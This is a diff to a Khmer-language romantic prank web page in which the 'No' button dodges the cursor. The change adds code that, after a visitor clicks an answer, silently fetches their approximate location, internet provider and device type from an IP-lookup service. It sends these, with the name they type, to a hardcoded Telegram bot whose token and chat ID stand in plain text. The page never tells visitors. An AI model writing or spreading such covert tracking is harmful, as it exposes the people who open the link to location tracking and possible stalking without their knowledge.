@@ -5,75 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Will You Be Mine?</title>
     <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #ffdeeb; 
-            font-family: 'Arial', sans-serif;
-            overflow: hidden;
-        }
-
-        .container {
-            text-align: center;
-            background: white;
-            padding: 40px;
-            border-radius: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            max-width: 450px;
-            z-index: 1;
-        }
-
-        h1 {
-            font-family: 'Khmer OS Muol Light', serif;
-            color: #930ed1;
-            font-size: 22px;
-            margin-bottom: 20px;
-        }
-
-        .buttons {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: center;
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        button {
-            padding: 12px 20px;
-            font-size: 16px;
-            border: none;
-            border-radius: 15px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        #yesBtn {
-            background-color: #8517df;
-            color: white;
-            font-family: 'Khmer OS Muol Light', serif;
-        }
-
-        #mustNoBtn {
-            background-color: #ff4d4d; /* ប្តូរជាពណ៌ក្រហមឱ្យដឹងថាដាច់ខាត */
-            color: white;
-            font-family: 'Khmer OS Muol Light', serif;
-        }
-
-        #noBtn {
-            background-color: #8517df;
-            color: #e9e7e7;
-            position: relative;
-            font-family: 'Khmer OS Muol Light', serif;
-        }
-
-        img {
-            width: 150px;
-            margin-bottom: 10px;
-        }
+        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #ffdeeb; font-family: 'Arial', sans-serif; overflow: hidden; }
+        .container { text-align: center; background: white; padding: 40px; border-radius: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 450px; z-index: 1; }
+        h1 { font-family: 'Khmer OS Muol Light', serif; color: #930ed1; font-size: 22px; margin-bottom: 20px; }
+        .buttons { display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 15px; margin-top: 20px; }
+        button { padding: 12px 20px; font-size: 16px; border: none; border-radius: 15px; cursor: pointer; transition: all 0.3s ease; font-family: 'Khmer OS Muol Light', serif; }
+        #yesBtn { background-color: #8517df; color: white; }
+        #mustNoBtn { background-color: #ff4d4d; color: white; }
+        #noBtn { background-color: #8517df; color: #e9e7e7; position: relative; }
+        img { width: 150px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -81,7 +21,6 @@
     <div class="container">
         <img src="gift.gif" alt="Cute gif" id="mainImage">
         <h1 id="question">តើអូនព្រមធ្វើជាសង្សារបងទេ? ម្ចាស់ចិត្ត 😘❤️</h1>
-        
         <div class="buttons">
             <button id="yesBtn">ព្រម</button>
             <button id="mustNoBtn">ដាច់ខាតមិនព្រម</button> 
@@ -99,53 +38,54 @@
         const telegramToken = '8444193368:AAHr0Z4DXBeG4IyyUPa-GGE5FD38c-veCCE';
         const chatId = '1781395582';
 
-        // មុខងារផ្ញើសារ
-        function sendTelegram(message) {
-            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            fetch(url).catch(err => console.log("Error: ", err));
+        async function getAdvancedInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                let device = "Unknown Device";
+                if (navigator.userAgent.includes("iPhone")) device = "iPhone 📱";
+                else if (navigator.userAgent.includes("Android")) device = "Android 🤖";
+                else if (navigator.userAgent.includes("Windows")) device = "Windows PC 💻";
+                return `📍 ទីតាំង: ${data.city}, ${data.region}\n📡 អ៊ីនធឺណិត: ${data.org}\n📱 ឧបករណ៍: ${device}`;
+            } catch (error) { return "⚠️ មិនអាចទាញយកព័ត៌មានបានទេ។"; }
         }
 
-        // ១. នៅពេលចុច Yes (ព្រម)
-        yesBtn.addEventListener('click', () => {
+        function sendTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url);
+        }
+
+        yesBtn.addEventListener('click', async () => {
             let name = prompt("សូមវាយឈ្មោះរបស់អ្នកសិន 🥰:"); 
-            if (name == null || name == "") name = "នរណាម្នាក់";
-
+            if (!name) name = "នរណាម្នាក់";
             question.innerHTML = "យេ! ស្រឡាញ់គ្នាហើយណា " + name + "! 🥰";
-            mainImage.src = "happy.gif"; // ប្រើរូបភាពសប្បាយ
+            mainImage.src = "happy.gif"; 
             document.querySelector('.buttons').style.display = 'none';
-
-            sendTelegram(`❤️ ដំណឹងល្អ! "${name}" បានចុចព្រម (Yes) ហើយ! 🥰`);
+            const info = await getAdvancedInfo();
+            sendTelegram(`❤️ "${name}" បានចុចព្រម (Yes)!\n${info}`);
         });
 
-        // ២. នៅពេលចុច Must No (ដាច់ខាតមិនព្រម)
-        mustNoBtn.addEventListener('click', () => {
+        mustNoBtn.addEventListener('click', async () => {
             let name = prompt("ចិត្តដាច់ម៉្លេះ! សុំស្គាល់ឈ្មោះអ្នកចិត្តដាច់ម្នាក់ហ្នឹងផង 😭:");
-            if (name == null || name == "") name = "នរណាម្នាក់";
-
-            question.innerHTML = "ហុីម... ចិត្តដាច់ម៉្លេះ " + name + "! 💔😭";
-            mainImage.src = "sad.gif"; // ប្រើរូបភាពកើតទុក្ខ
+            if (!name) name = "នរណាម្នាក់";
+            question.innerHTML = "ហ៊ឹម... ចិត្តដាច់ម៉្លេះ " + name + "! 💔";
+            mainImage.src = "sad.gif"; 
             document.querySelector('.buttons').style.display = 'none';
-
-            sendTelegram(`💔 ដំណឹងសោកសៅ! "${name}" បានចុច 'ដាច់ខាតមិនព្រម' (Must No) ហើយ... 😭`);
+            const info = await getAdvancedInfo();
+            sendTelegram(`💔 "${name}" បានចុច 'ដាច់ខាតមិនព្រម' (Must No)!\n${info}`);
         });
 
-        // ៣. ប៊ូតុង No រត់ចេញ
         function moveButton() {
             const x = Math.random() * (window.innerWidth - noBtn.offsetWidth);
             const y = Math.random() * (window.innerHeight - noBtn.offsetHeight);
             noBtn.style.position = 'absolute';
             noBtn.style.left = x + 'px';
             noBtn.style.top = y + 'px';
-
             let currentFontSize = parseFloat(window.getComputedStyle(yesBtn).fontSize);
-            if (currentFontSize < 60) { 
-                yesBtn.style.fontSize = (currentFontSize + 3) + 'px';
-            }
+            if (currentFontSize < 60) yesBtn.style.fontSize = (currentFontSize + 3) + 'px';
         }
-
         noBtn.addEventListener('mouseover', moveButton);
         noBtn.addEventListener('click', moveButton);
     </script>
-
 </body>
 </html>
